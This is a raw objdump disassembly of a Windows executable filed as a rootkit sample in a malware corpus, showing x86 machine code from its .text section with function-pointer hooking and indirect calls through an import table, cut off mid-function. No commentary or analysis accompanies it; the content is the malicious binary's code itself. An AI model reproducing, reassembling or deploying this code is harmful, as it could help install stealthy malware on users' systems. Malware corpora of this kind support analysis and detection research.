
malware_samples/rootkit/8249e9c0ac0840a36d9a5b9ff3e217198a2f533159acd4bf3d9b0132cc079870.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	8b ff                	mov    %edi,%edi
  401002:	56                   	push   %esi
  401003:	be ac a7 40 00       	mov    $0x40a7ac,%esi
  401008:	56                   	push   %esi
  401009:	e8 9d 01 00 00       	call   0x4011ab
  40100e:	ff 35 14 12 41 00    	push   0x411214
  401014:	56                   	push   %esi
  401015:	68 04 12 41 00       	push   $0x411204
  40101a:	e8 bb 5c 00 00       	call   0x406cda
  40101f:	5e                   	pop    %esi
  401020:	c3                   	ret
  401021:	cc                   	int3
  401022:	cc                   	int3
  401023:	cc                   	int3
  401024:	cc                   	int3
  401025:	cc                   	int3
  401026:	cc                   	int3
  401027:	cc                   	int3
  401028:	cc                   	int3
  401029:	cc                   	int3
  40102a:	cc                   	int3
  40102b:	cc                   	int3
  40102c:	cc                   	int3
  40102d:	cc                   	int3
  40102e:	cc                   	int3
  40102f:	cc                   	int3
  401030:	8b ff                	mov    %edi,%edi
  401032:	55                   	push   %ebp
  401033:	8b ec                	mov    %esp,%ebp
  401035:	a1 0c 12 41 00       	mov    0x41120c,%eax
  40103a:	85 c0                	test   %eax,%eax
  40103c:	74 0c                	je     0x40104a
  40103e:	3d 30 10 40 00       	cmp    $0x401030,%eax
  401043:	74 05                	je     0x40104a
  401045:	ff 75 08             	push   0x8(%ebp)
  401048:	ff d0                	call   *%eax
  40104a:	e8 b1 ff ff ff       	call   0x401000
  40104f:	5d                   	pop    %ebp
  401050:	c2 04 00             	ret    $0x4
  401053:	cc                   	int3
  401054:	cc                   	int3
  401055:	cc                   	int3
  401056:	cc                   	int3
  401057:	cc                   	int3
  401058:	cc                   	int3
  401059:	cc                   	int3
  40105a:	cc                   	int3
  40105b:	cc                   	int3
  40105c:	cc                   	int3
  40105d:	cc                   	int3
  40105e:	cc                   	int3
  40105f:	cc                   	int3
  401060:	e8 9b ff ff ff       	call   0x401000
  401065:	c2 08 00             	ret    $0x8
  401068:	8b ff                	mov    %edi,%edi
  40106a:	55                   	push   %ebp
  40106b:	8b ec                	mov    %esp,%ebp
  40106d:	57                   	push   %edi
  40106e:	8b 7d 08             	mov    0x8(%ebp),%edi
  401071:	85 ff                	test   %edi,%edi
  401073:	75 0e                	jne    0x401083
  401075:	ff 75 0c             	push   0xc(%ebp)
  401078:	57                   	push   %edi
  401079:	e8 42 13 00 00       	call   0x4023c0
  40107e:	e9 b1 00 00 00       	jmp    0x401134
  401083:	53                   	push   %ebx
  401084:	56                   	push   %esi
  401085:	ff 75 0c             	push   0xc(%ebp)
  401088:	33 c0                	xor    %eax,%eax
  40108a:	66 a3 04 12 41 00    	mov    %ax,0x411204
  401090:	b8 08 02 00 00       	mov    $0x208,%eax
  401095:	be 04 12 41 00       	mov    $0x411204,%esi
  40109a:	56                   	push   %esi
  40109b:	89 3d 18 12 41 00    	mov    %edi,0x411218
  4010a1:	66 a3 06 12 41 00    	mov    %ax,0x411206
  4010a7:	c7 05 08 12 41 00 20 	movl   $0x411220,0x411208
  4010ae:	12 41 00 
  4010b1:	ff 15 b4 71 40 00    	call   *0x4071b4
  4010b7:	68 14 12 41 00       	push   $0x411214
  4010bc:	bb ac a7 40 00       	mov    $0x40a7ac,%ebx
  4010c1:	53                   	push   %ebx
  4010c2:	56                   	push   %esi
  4010c3:	57                   	push   %edi
  4010c4:	e8 17 5c 00 00       	call   0x406ce0
  4010c9:	85 c0                	test   %eax,%eax
  4010cb:	7c 65                	jl     0x401132
  4010cd:	53                   	push   %ebx
  4010ce:	e8 7d 00 00 00       	call   0x401150
  4010d3:	8b f0                	mov    %eax,%esi
  4010d5:	85 f6                	test   %esi,%esi
  4010d7:	7c 14                	jl     0x4010ed
  4010d9:	e8 19 01 00 00       	call   0x4011f7
  4010de:	ff 75 0c             	push   0xc(%ebp)
  4010e1:	57                   	push   %edi
  4010e2:	e8 d9 12 00 00       	call   0x4023c0
  4010e7:	8b f0                	mov    %eax,%esi
  4010e9:	85 f6                	test   %esi,%esi
  4010eb:	7d 09                	jge    0x4010f6
  4010ed:	e8 0e ff ff ff       	call   0x401000
  4010f2:	8b c6                	mov    %esi,%eax
  4010f4:	eb 3c                	jmp    0x401132
  4010f6:	a1 14 12 41 00       	mov    0x411214,%eax
  4010fb:	80 78 2c 00          	cmpb   $0x0,0x2c(%eax)
  4010ff:	74 15                	je     0x401116
  401101:	8b 47 34             	mov    0x34(%edi),%eax
  401104:	85 c0                	test   %eax,%eax
  401106:	74 05                	je     0x40110d
  401108:	a3 0c 12 41 00       	mov    %eax,0x41120c
  40110d:	c7 47 34 30 10 40 00 	movl   $0x401030,0x34(%edi)
  401114:	eb 1a                	jmp    0x401130
  401116:	f6 40 04 02          	testb  $0x2,0x4(%eax)
  40111a:	74 14                	je     0x401130
  40111c:	a1 f4 0e 41 00       	mov    0x410ef4,%eax
  401121:	a3 10 12 41 00       	mov    %eax,0x411210
  401126:	c7 05 f4 0e 41 00 60 	movl   $0x401060,0x410ef4
  40112d:	10 40 00 
  401130:	33 c0                	xor    %eax,%eax
  401132:	5e                   	pop    %esi
  401133:	5b                   	pop    %ebx
  401134:	5f                   	pop    %edi
  401135:	5d                   	pop    %ebp
  401136:	c2 08 00             	ret    $0x8
  401139:	cc                   	int3
  40113a:	cc                   	int3
  40113b:	cc                   	int3
  40113c:	cc                   	int3
  40113d:	cc                   	int3
  40113e:	cc                   	int3
  40113f:	cc                   	int3
  401140:	8b ff                	mov    %edi,%edi
  401142:	55                   	push   %ebp
  401143:	8b ec                	mov    %esp,%ebp
  401145:	e8 b6 0e 01 00       	call   0x412000
  40114a:	5d                   	pop    %ebp
  40114b:	e9 18 ff ff ff       	jmp    0x401068
  401150:	8b ff                	mov    %edi,%edi
  401152:	55                   	push   %ebp
  401153:	8b ec                	mov    %esp,%ebp
  401155:	56                   	push   %esi
  401156:	be d8 a7 40 00       	mov    $0x40a7d8,%esi
  40115b:	57                   	push   %edi
  40115c:	8b ce                	mov    %esi,%ecx
  40115e:	bf d8 a7 40 00       	mov    $0x40a7d8,%edi
  401163:	33 c0                	xor    %eax,%eax
  401165:	3b cf                	cmp    %edi,%ecx
  401167:	73 3c                	jae    0x4011a5
  401169:	83 3e 2c             	cmpl   $0x2c,(%esi)
  40116c:	75 32                	jne    0x4011a0
  40116e:	8b 46 20             	mov    0x20(%esi),%eax
  401171:	56                   	push   %esi
  401172:	ff 35 14 12 41 00    	push   0x411214
  401178:	89 35 dc a7 40 00    	mov    %esi,0x40a7dc
  40117e:	ff 75 08             	push   0x8(%ebp)
  401181:	85 c0                	test   %eax,%eax
  401183:	74 09                	je     0x40118e
  401185:	68 f0 6c 40 00       	push   $0x406cf0
  40118a:	ff d0                	call   *%eax
  40118c:	eb 05                	jmp    0x401193
  40118e:	e8 5d 5b 00 00       	call   0x406cf0
  401193:	85 c0                	test   %eax,%eax
  401195:	7c 0e                	jl     0x4011a5
  401197:	83 c6 2c             	add    $0x2c,%esi
  40119a:	3b f7                	cmp    %edi,%esi
  40119c:	72 cb                	jb     0x401169
  40119e:	eb 05                	jmp    0x4011a5
  4011a0:	b8 04 00 00 c0       	mov    $0xc0000004,%eax
  4011a5:	5f                   	pop    %edi
  4011a6:	5e                   	pop    %esi
  4011a7:	5d                   	pop    %ebp
  4011a8:	c2 04 00             	ret    $0x4
  4011ab:	8b ff                	mov    %edi,%edi
  4011ad:	55                   	push   %ebp
  4011ae:	8b ec                	mov    %esp,%ebp
  4011b0:	a1 dc a7 40 00       	mov    0x40a7dc,%eax
  4011b5:	b9 d8 a7 40 00       	mov    $0x40a7d8,%ecx
  4011ba:	56                   	push   %esi
  4011bb:	8b f1                	mov    %ecx,%esi
  4011bd:	3d d0 a7 40 00       	cmp    $0x40a7d0,%eax
  4011c2:	74 2e                	je     0x4011f2
  4011c4:	3b c1                	cmp    %ecx,%eax
  4011c6:	72 2a                	jb     0x4011f2
  4011c8:	8b 46 24             	mov    0x24(%esi),%eax
  4011cb:	56                   	push   %esi
  4011cc:	ff 35 14 12 41 00    	push   0x411214
  4011d2:	ff 75 08             	push   0x8(%ebp)
  4011d5:	85 c0                	test   %eax,%eax
  4011d7:	74 09                	je     0x4011e2
  4011d9:	68 00 6d 40 00       	push   $0x406d00
  4011de:	ff d0                	call   *%eax
  4011e0:	eb 05                	jmp    0x4011e7
  4011e2:	e8 19 5b 00 00       	call   0x406d00
  4011e7:	83 c6 2c             	add    $0x2c,%esi
  4011ea:	3b 35 dc a7 40 00    	cmp    0x40a7dc,%esi
  4011f0:	76 d6                	jbe    0x4011c8
  4011f2:	5e                   	pop    %esi
  4011f3:	5d                   	pop    %ebp
  4011f4:	c2 04 00             	ret    $0x4
  4011f7:	b9 e8 a7 40 00       	mov    $0x40a7e8,%ecx
  4011fc:	8b d1                	mov    %ecx,%edx
  4011fe:	b8 e8 a7 40 00       	mov    $0x40a7e8,%eax
  401203:	3b d0                	cmp    %eax,%edx
  401205:	73 27                	jae    0x40122e
  401207:	56                   	push   %esi
  401208:	57                   	push   %edi
  401209:	2b c1                	sub    %ecx,%eax
  40120b:	6a 14                	push   $0x14
  40120d:	48                   	dec    %eax
  40120e:	33 d2                	xor    %edx,%edx
  401210:	59                   	pop    %ecx
  401211:	f7 f1                	div    %ecx
  401213:	bf f8 a7 40 00       	mov    $0x40a7f8,%edi
  401218:	8b f0                	mov    %eax,%esi
  40121a:	46                   	inc    %esi
  40121b:	8b 07                	mov    (%edi),%eax
  40121d:	85 c0                	test   %eax,%eax
  40121f:	74 05                	je     0x401226
  401221:	ff d0                	call   *%eax
  401223:	89 47 fc             	mov    %eax,-0x4(%edi)
  401226:	83 c7 14             	add    $0x14,%edi
  401229:	4e                   	dec    %esi
  40122a:	75 ef                	jne    0x40121b
  40122c:	5f                   	pop    %edi
  40122d:	5e                   	pop    %esi
  40122e:	c3                   	ret
  40122f:	cc                   	int3
  401230:	55                   	push   %ebp
  401231:	8b ec                	mov    %esp,%ebp
  401233:	81 ec 18 05 00 00    	sub    $0x518,%esp
  401239:	a1 a4 a7 40 00       	mov    0x40a7a4,%eax
  40123e:	33 c5                	xor    %ebp,%eax
  401240:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401243:	53                   	push   %ebx
  401244:	56                   	push   %esi
  401245:	68 00 04 00 00       	push   $0x400
  40124a:	8d 85 fc fa ff ff    	lea    -0x504(%ebp),%eax
  401250:	6a 00                	push   $0x0
  401252:	50                   	push   %eax
  401253:	e8 78 56 00 00       	call   0x4068d0
  401258:	68 ff 00 00 00       	push   $0xff
  40125d:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  401263:	6a 00                	push   $0x0
  401265:	50                   	push   %eax
  401266:	e8 65 56 00 00       	call   0x4068d0
  40126b:	a1 fc a7 40 00       	mov    0x40a7fc,%eax
  401270:	83 c4 18             	add    $0x18,%esp
  401273:	8b 35 a4 0d 41 00    	mov    0x410da4,%esi
  401279:	32 db                	xor    %bl,%bl
  40127b:	8b ce                	mov    %esi,%ecx
  40127d:	c7 85 e8 fa ff ff 00 	movl   $0x0,-0x518(%ebp)
  401284:	00 00 00 
  401287:	c7 85 ec fa ff ff 00 	movl   $0x0,-0x514(%ebp)
  40128e:	00 00 00 
  401291:	50                   	push   %eax
  401292:	a1 14 12 41 00       	mov    0x411214,%eax
  401297:	50                   	push   %eax
  401298:	c7 85 f8 fa ff ff 00 	movl   $0x0,-0x508(%ebp)
  40129f:	00 00 00 
  4012a2:	ff 15 cc 71 40 00    	call   *0x4071cc
  4012a8:	ff d6                	call   *%esi
  4012aa:	8d 8d f8 fa ff ff    	lea    -0x508(%ebp),%ecx
  4012b0:	51                   	push   %ecx
  4012b1:	68 06 6d 40 00       	push   $0x406d06
  4012b6:	50                   	push   %eax
  4012b7:	e8 74 38 00 00       	call   0x404b30
  4012bc:	8b 8d f8 fa ff ff    	mov    -0x508(%ebp),%ecx
  4012c2:	85 c0                	test   %eax,%eax
  4012c4:	78 5d                	js     0x401323
  4012c6:	8d 41 0c             	lea    0xc(%ecx),%eax
  4012c9:	85 c0                	test   %eax,%eax
  4012cb:	74 56                	je     0x401323
  4012cd:	8b 41 08             	mov    0x8(%ecx),%eax
  4012d0:	85 c0                	test   %eax,%eax
  4012d2:	74 4f                	je     0x401323
  4012d4:	3d 00 04 00 00       	cmp    $0x400,%eax
  4012d9:	73 48                	jae    0x401323
  4012db:	68 00 04 00 00       	push   $0x400
  4012e0:	8d 85 fc fa ff ff    	lea    -0x504(%ebp),%eax
  4012e6:	6a 00                	push   $0x0
  4012e8:	50                   	push   %eax
  4012e9:	e8 e2 55 00 00       	call   0x4068d0
  4012ee:	8b 85 f8 fa ff ff    	mov    -0x508(%ebp),%eax
  4012f4:	83 c4 0c             	add    $0xc,%esp
  4012f7:	8b 48 08             	mov    0x8(%eax),%ecx
  4012fa:	83 c0 0c             	add    $0xc,%eax
  4012fd:	81 f9 00 04 00 00    	cmp    $0x400,%ecx
  401303:	72 05                	jb     0x40130a
  401305:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  40130a:	51                   	push   %ecx
  40130b:	50                   	push   %eax
  40130c:	8d 85 fc fa ff ff    	lea    -0x504(%ebp),%eax
  401312:	50                   	push   %eax
  401313:	e8 b2 55 00 00       	call   0x4068ca
  401318:	8b 8d f8 fa ff ff    	mov    -0x508(%ebp),%ecx
  40131e:	83 c4 0c             	add    $0xc,%esp
  401321:	b3 01                	mov    $0x1,%bl
  401323:	85 c9                	test   %ecx,%ecx
  401325:	74 09                	je     0x401330
  401327:	6a 00                	push   $0x0
  401329:	51                   	push   %ecx
  40132a:	ff 15 ac 71 40 00    	call   *0x4071ac
  401330:	5e                   	pop    %esi
  401331:	84 db                	test   %bl,%bl
  401333:	5b                   	pop    %ebx
  401334:	0f 84 a8 00 00 00    	je     0x4013e2
  40133a:	8d 85 fc fa ff ff    	lea    -0x504(%ebp),%eax
  401340:	50                   	push   %eax
  401341:	8d 85 e8 fa ff ff    	lea    -0x518(%ebp),%eax
  401347:	50                   	push   %eax
  401348:	ff 15 b0 71 40 00    	call   *0x4071b0
  40134e:	8d 85 f0 fa ff ff    	lea    -0x510(%ebp),%eax
  401354:	50                   	push   %eax
  401355:	8d 85 f4 fa ff ff    	lea    -0x50c(%ebp),%eax
  40135b:	50                   	push   %eax
  40135c:	8d 85 e8 fa ff ff    	lea    -0x518(%ebp),%eax
  401362:	50                   	push   %eax
  401363:	e8 68 09 00 00       	call   0x401cd0
  401368:	85 c0                	test   %eax,%eax
  40136a:	78 48                	js     0x4013b4
  40136c:	8b 85 f4 fa ff ff    	mov    -0x50c(%ebp),%eax
  401372:	85 c0                	test   %eax,%eax
  401374:	74 6c                	je     0x4013e2
  401376:	8d 8d fc fe ff ff    	lea    -0x104(%ebp),%ecx
  40137c:	51                   	push   %ecx
  40137d:	ff b5 f0 fa ff ff    	push   -0x510(%ebp)
  401383:	50                   	push   %eax
  401384:	e8 67 11 00 00       	call   0x4024f0
  401389:	68 51 61 78 58       	push   $0x58786151
  40138e:	ff b5 f4 fa ff ff    	push   -0x50c(%ebp)
  401394:	ff 15 ac 71 40 00    	call   *0x4071ac
  40139a:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  4013a0:	50                   	push   %eax
  4013a1:	e8 0a 28 00 00       	call   0x403bb0
  4013a6:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4013a9:	33 cd                	xor    %ebp,%ecx
  4013ab:	e8 c6 58 00 00       	call   0x406c76
  4013b0:	8b e5                	mov    %ebp,%esp
  4013b2:	5d                   	pop    %ebp
  4013b3:	c3                   	ret
  4013b4:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  4013ba:	68 1a 6d 40 00       	push   $0x406d1a
  4013bf:	50                   	push   %eax
  4013c0:	e8 11 55 00 00       	call   0x4068d6
  4013c5:	83 c4 08             	add    $0x8,%esp
  4013c8:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  4013ce:	50                   	push   %eax
  4013cf:	e8 dc 27 00 00       	call   0x403bb0
  4013d4:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4013d7:	33 cd                	xor    %ebp,%ecx
  4013d9:	e8 98 58 00 00       	call   0x406c76
  4013de:	8b e5                	mov    %ebp,%esp
  4013e0:	5d                   	pop    %ebp
  4013e1:	c3                   	ret
  4013e2:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4013e5:	32 c0                	xor    %al,%al
  4013e7:	33 cd                	xor    %ebp,%ecx
  4013e9:	e8 88 58 00 00       	call   0x406c76
  4013ee:	8b e5                	mov    %ebp,%esp
  4013f0:	5d                   	pop    %ebp
  4013f1:	c3                   	ret
  4013f2:	cc                   	int3
  4013f3:	cc                   	int3
  4013f4:	cc                   	int3
  4013f5:	cc                   	int3
  4013f6:	cc                   	int3
  4013f7:	cc                   	int3
  4013f8:	cc                   	int3
  4013f9:	cc                   	int3
  4013fa:	cc                   	int3
  4013fb:	cc                   	int3
  4013fc:	cc                   	int3
  4013fd:	cc                   	int3
  4013fe:	cc                   	int3
  4013ff:	cc                   	int3
  401400:	55                   	push   %ebp
  401401:	8b ec                	mov    %esp,%ebp
  401403:	83 ec 14             	sub    $0x14,%esp
  401406:	80 3d f0 a7 40 00 00 	cmpb   $0x0,0x40a7f0
  40140d:	74 08                	je     0x401417
  40140f:	b0 01                	mov    $0x1,%al
  401411:	8b e5                	mov    %ebp,%esp
  401413:	5d                   	pop    %ebp
  401414:	c2 0c 00             	ret    $0xc
  401417:	56                   	push   %esi
  401418:	57                   	push   %edi
  401419:	6a 14                	push   $0x14
  40141b:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40141e:	6a 00                	push   $0x0
  401420:	50                   	push   %eax
  401421:	e8 aa 54 00 00       	call   0x4068d0
  401426:	8b 45 10             	mov    0x10(%ebp),%eax
  401429:	83 c4 0c             	add    $0xc,%esp
  40142c:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40142f:	8b 35 a0 0d 41 00    	mov    0x410da0,%esi
  401435:	8b ce                	mov    %esi,%ecx
  401437:	83 4d f8 01          	orl    $0x1,-0x8(%ebp)
  40143b:	68 fc a7 40 00       	push   $0x40a7fc
  401440:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401443:	8d 45 ec             	lea    -0x14(%ebp),%eax
  401446:	50                   	push   %eax
  401447:	a1 14 12 41 00       	mov    0x411214,%eax
  40144c:	6a 00                	push   $0x0
  40144e:	57                   	push   %edi
  40144f:	ff 75 08             	push   0x8(%ebp)
  401452:	c7 45 ec 14 00 00 00 	movl   $0x14,-0x14(%ebp)
  401459:	50                   	push   %eax
  40145a:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  401461:	ff 15 cc 71 40 00    	call   *0x4071cc
  401467:	ff d6                	call   *%esi
  401469:	8b 4f 04             	mov    0x4(%edi),%ecx
  40146c:	8b f0                	mov    %eax,%esi
  40146e:	6a 04                	push   $0x4
  401470:	68 00 80 40 00       	push   $0x408000
  401475:	6a 04                	push   $0x4
  401477:	68 5c 72 40 00       	push   $0x40725c
  40147c:	51                   	push   %ecx
  40147d:	e8 ce 37 00 00       	call   0x404c50
  401482:	5f                   	pop    %edi
  401483:	85 f6                	test   %esi,%esi
  401485:	5e                   	pop    %esi
  401486:	78 0a                	js     0x401492
  401488:	e8 63 00 00 00       	call   0x4014f0
  40148d:	a2 f0 a7 40 00       	mov    %al,0x40a7f0
  401492:	a0 f0 a7 40 00       	mov    0x40a7f0,%al
  401497:	8b e5                	mov    %ebp,%esp
  401499:	5d                   	pop    %ebp
  40149a:	c2 0c 00             	ret    $0xc
  40149d:	cc                   	int3
  40149e:	cc                   	int3
  40149f:	cc                   	int3
  4014a0:	55                   	push   %ebp
  4014a1:	8b ec                	mov    %esp,%ebp
  4014a3:	83 ec 08             	sub    $0x8,%esp
  4014a6:	80 3d f0 a7 40 00 00 	cmpb   $0x0,0x40a7f0
  4014ad:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  4014b4:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4014bb:	74 21                	je     0x4014de
  4014bd:	a1 f4 a7 40 00       	mov    0x40a7f4,%eax
  4014c2:	50                   	push   %eax
  4014c3:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4014c6:	50                   	push   %eax
  4014c7:	ff 15 b0 71 40 00    	call   *0x4071b0
  4014cd:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4014d0:	50                   	push   %eax
  4014d1:	ff 15 a4 71 40 00    	call   *0x4071a4
  4014d7:	c6 05 f0 a7 40 00 00 	movb   $0x0,0x40a7f0
  4014de:	8b e5                	mov    %ebp,%esp
  4014e0:	5d                   	pop    %ebp
  4014e1:	c3                   	ret
  4014e2:	cc                   	int3
  4014e3:	cc                   	int3
  4014e4:	cc                   	int3
  4014e5:	cc                   	int3
  4014e6:	cc                   	int3
  4014e7:	cc                   	int3
  4014e8:	cc                   	int3
  4014e9:	cc                   	int3
  4014ea:	cc                   	int3
  4014eb:	cc                   	int3
  4014ec:	cc                   	int3
  4014ed:	cc                   	int3
  4014ee:	cc                   	int3
  4014ef:	cc                   	int3
  4014f0:	55                   	push   %ebp
  4014f1:	8b ec                	mov    %esp,%ebp
  4014f3:	81 ec 84 00 00 00    	sub    $0x84,%esp
  4014f9:	a1 fc a7 40 00       	mov    0x40a7fc,%eax
  4014fe:	56                   	push   %esi
  4014ff:	8b 35 34 0c 41 00    	mov    0x410c34,%esi
  401505:	8b ce                	mov    %esi,%ecx
  401507:	68 c0 72 40 00       	push   $0x4072c0
  40150c:	50                   	push   %eax
  40150d:	a1 14 12 41 00       	mov    0x411214,%eax
  401512:	50                   	push   %eax
  401513:	ff 15 cc 71 40 00    	call   *0x4071cc
  401519:	ff d6                	call   *%esi
  40151b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40151e:	85 c0                	test   %eax,%eax
  401520:	0f 84 ab 00 00 00    	je     0x4015d1
  401526:	a1 f4 a7 40 00       	mov    0x40a7f4,%eax
  40152b:	50                   	push   %eax
  40152c:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40152f:	50                   	push   %eax
  401530:	ff 15 b0 71 40 00    	call   *0x4071b0
  401536:	a1 f8 a7 40 00       	mov    0x40a7f8,%eax
  40153b:	50                   	push   %eax
  40153c:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40153f:	50                   	push   %eax
  401540:	ff 15 b0 71 40 00    	call   *0x4071b0
  401546:	a1 14 12 41 00       	mov    0x411214,%eax
  40154b:	8b 35 c4 0c 41 00    	mov    0x410cc4,%esi
  401551:	8b ce                	mov    %esi,%ecx
  401553:	6a 03                	push   $0x3
  401555:	ff 75 fc             	push   -0x4(%ebp)
  401558:	50                   	push   %eax
  401559:	ff 15 cc 71 40 00    	call   *0x4071cc
  40155f:	ff d6                	call   *%esi
  401561:	a1 14 12 41 00       	mov    0x411214,%eax
  401566:	8b 35 d8 0c 41 00    	mov    0x410cd8,%esi
  40156c:	8b ce                	mov    %esi,%ecx
  40156e:	6a 12                	push   $0x12
  401570:	ff 75 fc             	push   -0x4(%ebp)
  401573:	50                   	push   %eax
  401574:	ff 15 cc 71 40 00    	call   *0x4071cc
  40157a:	ff d6                	call   *%esi
  40157c:	a1 14 12 41 00       	mov    0x411214,%eax
  401581:	8b 35 c8 0c 41 00    	mov    0x410cc8,%esi
  401587:	8b ce                	mov    %esi,%ecx
  401589:	6a 01                	push   $0x1
  40158b:	ff 75 fc             	push   -0x4(%ebp)
  40158e:	50                   	push   %eax
  40158f:	ff 15 cc 71 40 00    	call   *0x4071cc
  401595:	ff d6                	call   *%esi
  401597:	8b 35 dc 0c 41 00    	mov    0x410cdc,%esi
  40159d:	8d 45 b8             	lea    -0x48(%ebp),%eax
  4015a0:	50                   	push   %eax
  4015a1:	ff 75 fc             	push   -0x4(%ebp)
  4015a4:	a1 14 12 41 00       	mov    0x411214,%eax
  4015a9:	8b ce                	mov    %esi,%ecx
  4015ab:	50                   	push   %eax
  4015ac:	ff 15 cc 71 40 00    	call   *0x4071cc
  4015b2:	ff d6                	call   *%esi
  4015b4:	85 c0                	test   %eax,%eax
  4015b6:	79 20                	jns    0x4015d8
  4015b8:	ff 75 fc             	push   -0x4(%ebp)
  4015bb:	a1 14 12 41 00       	mov    0x411214,%eax
  4015c0:	8b 35 a8 0c 41 00    	mov    0x410ca8,%esi
  4015c6:	8b ce                	mov    %esi,%ecx
  4015c8:	50                   	push   %eax
  4015c9:	ff 15 cc 71 40 00    	call   *0x4071cc
  4015cf:	ff d6                	call   *%esi
  4015d1:	32 c0                	xor    %al,%al
  4015d3:	5e                   	pop    %esi
  4015d4:	8b e5                	mov    %ebp,%esp
  4015d6:	5d                   	pop    %ebp
  4015d7:	c3                   	ret
  4015d8:	6a 20                	push   $0x20
  4015da:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4015dd:	c7 45 c4 18 00 00 00 	movl   $0x18,-0x3c(%ebp)
  4015e4:	6a 00                	push   $0x0
  4015e6:	50                   	push   %eax
  4015e7:	c7 45 c8 00 18 40 00 	movl   $0x401800,-0x38(%ebp)
  4015ee:	c7 45 cc f0 17 40 00 	movl   $0x4017f0,-0x34(%ebp)
  4015f5:	c7 45 d0 f0 17 40 00 	movl   $0x4017f0,-0x30(%ebp)
  4015fc:	c7 45 d8 04 00 00 00 	movl   $0x4,-0x28(%ebp)
  401603:	c7 45 d4 02 00 00 00 	movl   $0x2,-0x2c(%ebp)
  40160a:	e8 c1 52 00 00       	call   0x4068d0
  40160f:	8b 35 ec 0c 41 00    	mov    0x410cec,%esi
  401615:	8d 45 dc             	lea    -0x24(%ebp),%eax
  401618:	83 c4 0c             	add    $0xc,%esp
  40161b:	c7 45 dc 20 00 00 00 	movl   $0x20,-0x24(%ebp)
  401622:	8b ce                	mov    %esi,%ecx
  401624:	c7 45 e8 02 00 00 00 	movl   $0x2,-0x18(%ebp)
  40162b:	c7 45 ec 04 00 00 00 	movl   $0x4,-0x14(%ebp)
  401632:	50                   	push   %eax
  401633:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  401636:	50                   	push   %eax
  401637:	ff 75 fc             	push   -0x4(%ebp)
  40163a:	a1 14 12 41 00       	mov    0x411214,%eax
  40163f:	50                   	push   %eax
  401640:	ff 15 cc 71 40 00    	call   *0x4071cc
  401646:	ff d6                	call   *%esi
  401648:	6a 20                	push   $0x20
  40164a:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40164d:	6a 00                	push   $0x0
  40164f:	50                   	push   %eax
  401650:	e8 7b 52 00 00       	call   0x4068d0
  401655:	8b 35 fc 0c 41 00    	mov    0x410cfc,%esi
  40165b:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40165e:	83 c4 0c             	add    $0xc,%esp
  401661:	c7 45 dc 20 00 00 00 	movl   $0x20,-0x24(%ebp)
  401668:	8b ce                	mov    %esi,%ecx
  40166a:	c7 45 e8 01 00 00 00 	movl   $0x1,-0x18(%ebp)
  401671:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%ebp)
  401678:	68 00 a8 40 00       	push   $0x40a800
  40167d:	50                   	push   %eax
  40167e:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401681:	50                   	push   %eax
  401682:	a1 14 12 41 00       	mov    0x411214,%eax
  401687:	50                   	push   %eax
  401688:	ff 15 cc 71 40 00    	call   *0x4071cc
  40168e:	ff d6                	call   *%esi
  401690:	85 c0                	test   %eax,%eax
  401692:	0f 88 20 ff ff ff    	js     0x4015b8
  401698:	6a 34                	push   $0x34
  40169a:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  4016a0:	6a 00                	push   $0x0
  4016a2:	50                   	push   %eax
  4016a3:	e8 28 52 00 00       	call   0x4068d0
  4016a8:	6a 20                	push   $0x20
  4016aa:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4016ad:	c7 85 7c ff ff ff 34 	movl   $0x34,-0x84(%ebp)
  4016b4:	00 00 00 
  4016b7:	6a 00                	push   $0x0
  4016b9:	50                   	push   %eax
  4016ba:	c7 45 84 02 00 00 00 	movl   $0x2,-0x7c(%ebp)
  4016c1:	c6 45 89 01          	movb   $0x1,-0x77(%ebp)
  4016c5:	c7 45 80 02 00 00 00 	movl   $0x2,-0x80(%ebp)
  4016cc:	c7 45 ac ff ff ff ff 	movl   $0xffffffff,-0x54(%ebp)
  4016d3:	c7 45 90 00 00 00 00 	movl   $0x0,-0x70(%ebp)
  4016da:	c7 45 94 00 00 00 00 	movl   $0x0,-0x6c(%ebp)
  4016e1:	c7 45 98 90 17 40 00 	movl   $0x401790,-0x68(%ebp)
  4016e8:	e8 e3 51 00 00       	call   0x4068d0
  4016ed:	a1 00 a8 40 00       	mov    0x40a800,%eax
  4016f2:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  4016f5:	8b 35 30 0e 41 00    	mov    0x410e30,%esi
  4016fb:	83 c4 18             	add    $0x18,%esp
  4016fe:	c7 45 dc 20 00 00 00 	movl   $0x20,-0x24(%ebp)
  401705:	c7 45 e8 02 00 00 00 	movl   $0x2,-0x18(%ebp)
  40170c:	c7 45 ec 04 00 00 00 	movl   $0x4,-0x14(%ebp)
  401713:	51                   	push   %ecx
  401714:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  401717:	51                   	push   %ecx
  401718:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  40171e:	51                   	push   %ecx
  40171f:	50                   	push   %eax
  401720:	a1 14 12 41 00       	mov    0x411214,%eax
  401725:	8b ce                	mov    %esi,%ecx
